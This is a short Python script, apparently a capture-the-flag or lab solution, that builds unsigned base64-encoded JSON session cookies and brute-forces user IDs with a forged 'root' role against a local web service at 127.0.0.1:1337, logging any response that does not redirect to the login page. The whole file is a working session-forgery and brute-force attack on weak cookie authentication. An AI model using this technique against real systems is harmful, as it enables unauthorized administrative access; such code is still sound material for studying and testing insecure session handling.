import json
import requests
import base64
import time


def generate_sess_id():
    tempo = int(time.time()//1)+3600

    payload = {
        "u":"neo",
        "id":1337,
        "r":"user",
        "exp":tempo, 
        "v":1
    }

    payload_json = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
    payload_bytes = payload_json.encode('utf-8')
    encoded = base64.b64encode(payload_bytes).decode('utf-8')

    return encoded

def print_sess_id(user, id, role):
    tempo = int(time.time()//1)+3600
    i = 0
    payload = {
            "u":user,
            "id":id,
            "r":role,
            "exp":tempo, 
            "v":1
        }

    payload_json = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
    payload_bytes = payload_json.encode('utf-8')
    encoded = base64.b64encode(payload_bytes).decode('utf-8')
    print(f"Encoded: {encoded}")
        
def brutefeorce_sess_id():
    sess = requests.session()
    sess.headers.update({
    "Connection": "keep-alive",
    "Content-Type": "application/json"
})
    tempo = int(time.time()//1)+3600
    i = 0
    for i in range(1000,10000):
        time.sleep(0.1)
        payload = {
                "u":"root",
                "id":i,
                "r":"root",
                "exp":tempo, 
                "v":1
            }

        payload_json = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
        payload_bytes = payload_json.encode('utf-8')
        encoded = base64.b64encode(payload_bytes).decode('utf-8')
        r = sess.get('http://127.0.0.1:1337/root', cookies={'session_id': encoded})
        if('/login' not in r.text):
                with open('resposta_sess_id.txt', 'a', encoding='utf-8') as arquivo:
                    arquivo.write(f'Session Id: {encoded} | Status Code: {r.status_code}\n')
                with open(f'FofaosSCript/codigo_dokrl{i}.html', 'w', encoding='utf-8') as arquivo:
                    arquivo.write(r.text)

print_sess_id('root', 9001, 'user')
#brutefeorce_sess_id()
#print('10K!')
